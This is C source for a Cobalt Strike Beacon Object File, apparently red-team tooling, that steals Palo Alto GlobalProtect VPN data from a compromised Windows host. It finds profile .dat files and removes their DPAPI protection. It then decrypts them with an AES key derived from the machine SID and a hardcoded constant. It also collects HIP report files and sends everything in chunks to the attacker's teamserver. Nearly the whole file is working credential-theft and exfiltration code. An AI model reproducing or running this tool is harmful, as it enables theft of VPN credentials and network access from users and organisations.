// GlobalUnprotect.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <shlobj.h>
#include <bcrypt.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"


#define CALLBACK_FILE       0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09
#define CHUNK_SIZE 0xe1000

#define CHECK_NTSTATUS(x) \
{ \
    NTSTATUS status = x; \
if (!NT_SUCCESS(status)) \
{ \
    BeaconPrintf(CALLBACK_ERROR, "[!] error %s : 0x%x\n", #x, status); \
    goto end; \
} \
}

#define CHECK_ZERO(x) \
{ \
if (!x) \
{ \
    BeaconPrintf(CALLBACK_ERROR, "[!] error %s : %lu\n", #x, KERNEL32$GetLastError()); \
    goto end; \
} \
}

#define AES_KEY_SIZE 32  // 256 bits
#define AES_BLOCK_SIZE 16 // 128 bits
BYTE* DPAPIUnprotect(const char* filePath, DWORD* decryptedSize);
BYTE* AESDecrypt(BYTE* encryptedBytes, DWORD encryptedSize, BYTE* aesKey, DWORD* decryptedSize);

//    CryptUnprotectData

// For anyone wonder after the fact why this one uses a bunch of function pointers, its because I simply had chatgpt convert to using function pointers as an experiment and decided to keep it that way just because instead of converting fully to DFR
typedef HRESULT(WINAPI* pSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
typedef DWORD(WINAPI* pGetFileAttributesA)(LPCSTR);
typedef HANDLE(WINAPI* pFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL(WINAPI* pFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL(WINAPI* pFindClose)(HANDLE);
typedef BOOL(WINAPI* pCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
typedef HANDLE(WINAPI* pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
typedef DWORD(WINAPI* pGetFileSize)(HANDLE, LPDWORD);
typedef NTSTATUS(WINAPI* pBCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS(WINAPI* pBCryptSetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* pBCryptGetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* pBCryptGenerateSymmetricKey)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* pBCryptDecrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* pBCryptDestroyKey)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS(WINAPI* pBCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE, ULONG);
typedef NTSTATUS(WINAPI* pBCryptCreateHash)(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* pBCryptHashData)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* pBCryptFinishHash)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* pBCryptDestroyHash)(BCRYPT_HASH_HANDLE);



// __cdecl calling convention for msvcrt functions
typedef void* (__cdecl* pMalloc)(size_t);
typedef void(__cdecl* pFree)(void*);
typedef void* (__cdecl* pMemcpy)(void*, const void*, size_t);

// Function pointer variables
pSHGetFolderPathA fpSHGetFolderPathA = NULL;
pGetFileAttributesA fpGetFileAttributesA = NULL;
pFindFirstFileA fpFindFirstFileA = NULL;
pFindNextFileA fpFindNextFileA = NULL;
pFindClose fpFindClose = NULL;
pCryptUnprotectData fpCryptUnprotectData = NULL;
pCreateFileA fpCreateFileA = NULL;
pReadFile fpReadFile = NULL;
pCloseHandle fpCloseHandle = NULL;
pGetFileSize fpGetFileSize = NULL;
pMemcpy fpMemcpy = NULL;
pBCryptOpenAlgorithmProvider fpBCryptOpenAlgorithmProvider = NULL;
pBCryptSetProperty fpBCryptSetProperty = NULL;
pBCryptGetProperty fpBCryptGetProperty = NULL;
pBCryptGenerateSymmetricKey fpBCryptGenerateSymmetricKey = NULL;
pBCryptDecrypt fpBCryptDecrypt = NULL;
pBCryptDestroyKey fpBCryptDestroyKey = NULL;
pBCryptCloseAlgorithmProvider fpBCryptCloseAlgorithmProvider = NULL;
pBCryptCreateHash fpBCryptCreateHash = NULL;
pBCryptHashData fpBCryptHashData = NULL;
pBCryptFinishHash fpBCryptFinishHash = NULL;
pBCryptDestroyHash fpBCryptDestroyHash = NULL;


HMODULE hShell32 = NULL;
HMODULE hKernel32 = NULL;
HMODULE hCrypt32 = NULL;
HMODULE hMsvcrt = NULL;
HMODULE hBcrypt = NULL;

// Function to dynamically load required functions

void FreeLibraries()
{
 if( hShell32 != NULL) {KERNEL32$FreeLibrary(hShell32);}
 if( hKernel32 != NULL) {KERNEL32$FreeLibrary(hKernel32);}
 if( hCrypt32 != NULL) {KERNEL32$FreeLibrary(hCrypt32);}
 if( hMsvcrt != NULL) {KERNEL32$FreeLibrary(hMsvcrt);}
 if( hBcrypt != NULL) {KERNEL32$FreeLibrary(hBcrypt);}
}

int LoadFunctions()
{
    HMODULE hShell32 = LoadLibraryA("shell32.dll");
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hCrypt32 = LoadLibraryA("crypt32.dll");
    HMODULE hMsvcrt = LoadLibraryA("msvcrt.dll");
    HMODULE hBcrypt = LoadLibraryA("bcrypt.dll");

    if (!hShell32 || !hKernel32 || !hCrypt32 || !hMsvcrt) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to load necessary DLLs.\n");
        return -1;
    }

    // Acquire function pointers from shell32.dll
    fpSHGetFolderPathA = (pSHGetFolderPathA)GetProcAddress(hShell32, "SHGetFolderPathA");

    // Acquire function pointers from kernel32.dll
    fpGetFileAttributesA = (pGetFileAttributesA)GetProcAddress(hKernel32, "GetFileAttributesA");
    fpFindFirstFileA = (pFindFirstFileA)GetProcAddress(hKernel32, "FindFirstFileA");
    fpFindNextFileA = (pFindNextFileA)GetProcAddress(hKernel32, "FindNextFileA");
    fpFindClose = (pFindClose)GetProcAddress(hKernel32, "FindClose");
    fpCreateFileA = (pCreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    fpReadFile = (pReadFile)GetProcAddress(hKernel32, "ReadFile");
    fpCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    fpGetFileSize = (pGetFileSize)GetProcAddress(hKernel32, "GetFileSize");

    //bcrypt
    fpBCryptOpenAlgorithmProvider = (pBCryptOpenAlgorithmProvider)GetProcAddress(hBcrypt, "BCryptOpenAlgorithmProvider");
    fpBCryptSetProperty = (pBCryptSetProperty)GetProcAddress(hBcrypt, "BCryptSetProperty");
    fpBCryptGetProperty = (pBCryptGetProperty)GetProcAddress(hBcrypt, "BCryptGetProperty");
    fpBCryptGenerateSymmetricKey = (pBCryptGenerateSymmetricKey)GetProcAddress(hBcrypt, "BCryptGenerateSymmetricKey");
    fpBCryptDecrypt = (pBCryptDecrypt)GetProcAddress(hBcrypt, "BCryptDecrypt");
    fpBCryptDestroyKey = (pBCryptDestroyKey)GetProcAddress(hBcrypt, "BCryptDestroyKey");
    fpBCryptCloseAlgorithmProvider = (pBCryptCloseAlgorithmProvider)GetProcAddress(hBcrypt, "BCryptCloseAlgorithmProvider");
	fpBCryptCreateHash = (pBCryptCreateHash)GetProcAddress(hBcrypt, "BCryptCreateHash");
    fpBCryptHashData = (pBCryptHashData)GetProcAddress(hBcrypt, "BCryptHashData");
    fpBCryptFinishHash = (pBCryptFinishHash)GetProcAddress(hBcrypt, "BCryptFinishHash");
    fpBCryptDestroyHash = (pBCryptDestroyHash)GetProcAddress(hBcrypt, "BCryptDestroyHash");



    // Acquire function pointers from crypt32.dll
    fpCryptUnprotectData = (pCryptUnprotectData)GetProcAddress(hCrypt32, "CryptUnprotectData");

    // Acquire function pointers from msvcrt.dll
    fpMemcpy = (pMemcpy)GetProcAddress(hMsvcrt, "memcpy");

    // Check if all necessary functions were successfully loaded
    if (!fpSHGetFolderPathA || !fpGetFileAttributesA || !fpFindFirstFileA || !fpFindNextFileA || !fpFindClose ||
        !fpCryptUnprotectData || !fpCreateFileA || !fpReadFile || !fpCloseHandle || !fpGetFileSize || 
        !fpBCryptOpenAlgorithmProvider || !fpBCryptSetProperty || !fpBCryptGetProperty ||
        !fpBCryptGenerateSymmetricKey || !fpBCryptDecrypt || !fpBCryptDestroyKey || !fpBCryptCloseAlgorithmProvider ||
		!fpBCryptCreateHash || !fpBCryptHashData || ! fpBCryptFinishHash || !fpBCryptDestroyHash ||
        !fpMemcpy) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to acquire all function pointers.\n");
        return -1;
    }

    return 0;
}

BOOL download_file(
	char * fileName,
    char * fileData,
    ULONG32 fileLength)
{
	int fileNameLength = MSVCRT$strnlen(fileName, 1024);
    // intializes the random number generator

	char* packedData = NULL;
	char* packedChunk = NULL;
	ULONG32 fileId = 0;
	int messageLength = 0;
	int chunkLength = 0;
	ULONG32 exfiltrated = 0;
	ULONG32 chunkIndex = 4;
	char packedClose[4];
	DWORD _;
    // generate a 4 byte random id, rand max value is 0x7fff
    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x11;
    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x02;
    fileId |= (MSVCRT$rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    messageLength = 8 + fileNameLength;
    packedData = intAlloc(messageLength);
    if (!packedData)
    {
        internal_printf("Could download the dump");
        goto end;
    }

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < fileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(
        CALLBACK_FILE,
        packedData,
        messageLength);
    intFree(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    chunkLength = 4 + CHUNK_SIZE;
    packedChunk = intAlloc(chunkLength);
    if (!packedChunk)
    {
        internal_printf("Could download the dump");
        goto end;
    }
    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;


    while (exfiltrated < fileLength)
    {
        // send the file content by chunks
        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
        chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // send a chunk
        BeaconOutput(
            CALLBACK_FILE_WRITE,
            packedChunk,
            4 + chunkLength);
        exfiltrated += chunkLength;
    }
    intFree(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId

    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(
        CALLBACK_FILE_CLOSE,
        packedClose,
        4);
    internal_printf("The file %s was downloaded Len %d ID %lu\n", fileName, fileLength, fileId);
	end: 
	if(packedData) intFree(packedData);
	if(packedChunk) intFree(packedChunk);
    return TRUE;
}

void Search(unsigned char * aeskey)
{
    char localAppDataPath[MAX_PATH];
    char roamingAppDataPath[MAX_PATH];
    char searchPattern[MAX_PATH];
	char foundFile[MAX_PATH];
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind;
	int fileCount = 0;

    int allocatedSize = 0;

    // Get paths to LocalApplicationData and ApplicationData folders
    HRESULT result1 = fpSHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppDataPath);
    HRESULT result2 = fpSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roamingAppDataPath);

    if (FAILED(result1) || FAILED(result2)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get application data paths.\n");
        return;
    }

    // Construct possible GlobalProtect paths
    MSVCRT$strcat(localAppDataPath, "\\Palo Alto Networks\\GlobalProtect");
    MSVCRT$strcat(roamingAppDataPath, "\\Palo Alto Networks\\GlobalProtect");

    const char* possiblePaths[2] = { localAppDataPath, roamingAppDataPath };
    BOOL foundPath = FALSE;

    // Check if paths exist and search for .dat files
    for (int i = 0; i < 2; i++) {
        if (fpGetFileAttributesA(possiblePaths[i]) != INVALID_FILE_ATTRIBUTES) {
            foundPath = TRUE;

            // Search for .dat files in the found directories
            MSVCRT$_snprintf(searchPattern, MAX_PATH, "%s\\*.dat", possiblePaths[i]);
            hFind = fpFindFirstFileA(searchPattern, &findFileData);

            if (hFind == INVALID_HANDLE_VALUE) {
                continue;
            }

            do {
                if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    // Allocate memory for the full path of the found file
					fileCount++;
                    MSVCRT$_snprintf(foundFile, MAX_PATH, "%s\\%s", possiblePaths[i], findFileData.cFileName);
					DWORD cbdata = 0;
					BYTE * AESdata = DPAPIUnprotect(foundFile, &cbdata);
					if(AESdata)
					{
						BYTE * data = AESDecrypt(AESdata, cbdata, aeskey, &cbdata);
						download_file(findFileData.cFileName, data, cbdata);
                        intFree(AESdata);
						intFree(data);
					}

                }
            } while (fpFindNextFileA(hFind, &findFileData) != 0);

            fpFindClose(hFind);
        }
    }

    if (!foundPath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No GlobalProtect profile paths were found, nothing to do.\n");
		return;
    }

    if (fileCount == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No .dat files found in GlobalProtect paths, nothing to do.\n");
    }
	internal_printf("Processed %d config files\n", fileCount);

}

BYTE* ReadFileBytes(const char* filePath, DWORD* fileSize)
{
	BYTE* buffer = NULL;
    HANDLE hFile = fpCreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open file: %s\n", filePath);
        return NULL;
    }

    // Get the file size
    *fileSize = fpGetFileSize(hFile, NULL);
    if (*fileSize == INVALID_FILE_SIZE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get file size: %s\n", filePath);
        goto end;
    }

    buffer = (BYTE*)intAlloc(*fileSize);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed.\n");
        goto end;
    }

    DWORD bytesRead = 0;
    if (!fpReadFile(hFile, buffer, *fileSize, &bytesRead, NULL) || bytesRead != *fileSize) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read file: %s\n", filePath);
        intFree(buffer);
        goto end;
    }
	end: 
    if(hFile != INVALID_HANDLE_VALUE) {fpCloseHandle(hFile);}
    return buffer;
}

BYTE* DPAPIUnprotect(const char* filePath, DWORD* decryptedSize)
{
    DWORD fileSize = 0;
    BYTE* encryptedBytes = ReadFileBytes(filePath, &fileSize);
    if (!encryptedBytes) {
        return NULL;
    }

    DATA_BLOB dataIn;
    DATA_BLOB dataOut;
    dataIn.pbData = encryptedBytes;
    dataIn.cbData = fileSize;

    // Unprotect the data
    if (!fpCryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to unprotect data.\n");
        intFree(encryptedBytes);
        return NULL;
    }

    *decryptedSize = dataOut.cbData;

    // Copy the decrypted data to a buffer to return
    BYTE* decryptedBytes = (BYTE*)intAlloc(dataOut.cbData);
    if (!decryptedBytes) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed for decrypted data.\n");
        intFree(encryptedBytes);
        KERNEL32$LocalFree(dataOut.pbData);
        return NULL;
    }

    fpMemcpy(decryptedBytes, dataOut.pbData, dataOut.cbData);

    // Clean up
    intFree(encryptedBytes);
    KERNEL32$LocalFree(dataOut.pbData);

    return decryptedBytes;
}

//DecryptionKey is expected to be an array of 32 bytes to hold the finalized key
//outhash must have at least 16 bytes availablr
void HashValue(PUCHAR data, DWORD length, PUCHAR outHash)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BYTE bpHashObj[2048] = { 0 };
    CHECK_NTSTATUS(fpBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD5_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0));
    CHECK_NTSTATUS(fpBCryptCreateHash(hAlg, &hHash, bpHashObj, 2048, NULL, 0, 0));
    CHECK_NTSTATUS(fpBCryptHashData(hHash, data, length, 0));
    CHECK_NTSTATUS(fpBCryptFinishHash(hHash, outHash, 16, 0));

end:
    if (hAlg) { fpBCryptCloseAlgorithmProvider(hAlg, 0); }
    if (hHash) { fpBCryptDestroyHash(hHash); }
}

//SID must be freed by caller
void GetComputerSID(PUCHAR * output, DWORD * cboutput)
{
    *output = NULL;
    PSID sid = NULL;
    char computername[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD cbComputerName = MAX_COMPUTERNAME_LENGTH + 1;
    DWORD cbrefDomain = 0;
    char* refDomain = NULL;
    SID_NAME_USE _;
    CHECK_ZERO(KERNEL32$GetComputerNameA(computername, &cbComputerName));
    ADVAPI32$LookupAccountNameA(NULL, computername, NULL, cboutput, NULL, &cbrefDomain, &_);
    sid = intAlloc(*cboutput);
    refDomain = (char *)intAlloc(cbrefDomain);
    CHECK_ZERO(ADVAPI32$LookupAccountNameA(NULL, computername, sid, cboutput, refDomain, &cbrefDomain, &_));
    *output = (PUCHAR)sid;
done:
    if (refDomain) { intFree(refDomain); }
    return;

    end:
    if (sid) { intFree(sid); }
    cboutput = 0;
    goto done;
   

}

void GetKey(unsigned char * DecryptionKey)
{
    unsigned char panMD5[] = {
    0x75, 0xb8, 0x49, 0x83, 0x90, 0xbc, 0x2a, 0x65,
    0x9c, 0x56, 0x93, 0xe7, 0xe5, 0xc5, 0xf0, 0x24
    };
    PUCHAR binarysid = NULL;
    DWORD cbbinarysid = 0;
    GetComputerSID(&binarysid, &cbbinarysid);
    unsigned char * buffer = (PUCHAR)intAlloc(cbbinarysid + sizeof(panMD5));
    MSVCRT$memcpy(buffer, binarysid, cbbinarysid);
    MSVCRT$memcpy(buffer + cbbinarysid, panMD5, sizeof(panMD5));
    HashValue(buffer, cbbinarysid + sizeof(panMD5), (PUCHAR)DecryptionKey);
    MSVCRT$memcpy(DecryptionKey + 16, DecryptionKey, 16); // Key is just our derived key repeated to make 32 bytes


    if (binarysid) { intFree(binarysid); }
    if (buffer) { intFree(buffer); }

}

BYTE* AESDecrypt(BYTE* encryptedBytes, DWORD encryptedSize, BYTE* aesKey, DWORD* decryptedSize)
{
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD blockLen = AES_BLOCK_SIZE;
    DWORD keyObjectLength = 0;
    DWORD dataLength = 0;
    DWORD result = 0;
    BYTE iv[AES_BLOCK_SIZE] = { 0 };  // 16-byte IV (same as the C# code with a zeroed IV)
    BYTE* keyObject = NULL;
    BYTE* decryptedBytes = NULL;

    // Open an AES algorithm provider
    CHECK_NTSTATUS(fpBCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0));
    // Get the size of the key object
    CHECK_NTSTATUS(fpBCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLength, sizeof(DWORD), &result, 0));

    // Allocate memory for the key object
    keyObject = (BYTE*)intAlloc(keyObjectLength);

    // Set the chaining mode to CBC (Cipher Block Chaining)
    CHECK_NTSTATUS(fpBCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0));

    // Generate the symmetric AES key
    CHECK_NTSTATUS(fpBCryptGenerateSymmetricKey(hAesAlg, &hKey, keyObject, keyObjectLength, aesKey, AES_KEY_SIZE, 0));

    // Allocate memory for decrypted output
    decryptedBytes = (BYTE*)intAlloc(encryptedSize);

    // Decrypt the data
    CHECK_NTSTATUS(fpBCryptDecrypt(hKey, encryptedBytes, encryptedSize, NULL, iv, AES_BLOCK_SIZE, decryptedBytes, encryptedSize, &dataLength, BCRYPT_BLOCK_PADDING));

    *decryptedSize = dataLength;
    end:
    // Cleanup
    if (hKey) {
        fpBCryptDestroyKey(hKey);
    }
    if (hAesAlg) {
        fpBCryptCloseAlgorithmProvider(hAesAlg, 0);
    }
    if (keyObject) {
        intFree(keyObject);
    }

    return decryptedBytes;
}

void CollectHIPFiles(BYTE* aesKey)
{
    char programFilesPath[MAX_PATH];
    char globalProtectPath[MAX_PATH];
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind;

    // Retrieve the Program Files path
    if (fpSHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, programFilesPath) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get Program Files path.\n");
        return;
    }

    // Construct the GlobalProtect path
    MSVCRT$_snprintf(globalProtectPath, MAX_PATH, "%s\\Palo Alto Networks\\GlobalProtect", programFilesPath);

    // File patterns to search for
    const char* patterns[] = {
        "HIP_*_Report_*.dat",
        "HipPolicy.dat",
        "PanGPHip.log"
    };

    const int numPatterns = sizeof(patterns) / sizeof(patterns[0]);

    internal_printf("[*] Collecting HIP profile data files\n");

    // Iterate over file patterns
    for (int i = 0; i < numPatterns; i++) {
        char searchPattern[MAX_PATH];
        MSVCRT$_snprintf(searchPattern, MAX_PATH, "%s\\%s", globalProtectPath, patterns[i]);

        // Find the files matching the current pattern
        hFind = fpFindFirstFileA(searchPattern, &findFileData);
        if (hFind == INVALID_HANDLE_VALUE) {
            continue;  // Skip to the next pattern if no files are found
        }

        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                char filePath[MAX_PATH];
                MSVCRT$_snprintf(filePath, MAX_PATH, "%s\\%s", globalProtectPath, findFileData.cFileName);

                DWORD fileSize = 0;
                BYTE* fileBytes = ReadFileBytes(filePath, &fileSize);

                if (fileBytes) {
                    // If it's a .dat file, decrypt it
                    if (MSVCRT$strstr(findFileData.cFileName, ".dat") != NULL) {
                        DWORD decryptedSize = 0;
                        BYTE* decryptedBytes = AESDecrypt(fileBytes, fileSize, aesKey, &decryptedSize);
                        download_file(findFileData.cFileName, decryptedBytes, decryptedSize);
						intFree(decryptedBytes);
                    }
                    else {
                        download_file(findFileData.cFileName, fileBytes, fileSize);
                    }

                    // Clean up
                    intFree(fileBytes);
                }
            }
        } while (fpFindNextFileA(hFind, &findFileData) != 0);

        fpFindClose(hFind);
    }
}


//Not taking arguments will output to download files
void go(char * buffer, int Length)
{
    __time32_t t;
    MSVCRT$srand((unsigned) MSVCRT$_time32(&t));
	if (!bofstart())
    {
        return;
    }
	LoadFunctions();
    unsigned char key[32] = { 0 };
    char** configs = NULL;
    int configCount = 0;
	internal_printf("[+] Starting Collection\n");
    GetKey(key);
	internal_printf("[+] Got Decryption Key\n");
    Search(key);
    CollectHIPFiles(key);
	FreeLibraries();
	printoutput(TRUE);
    bofstop();

}

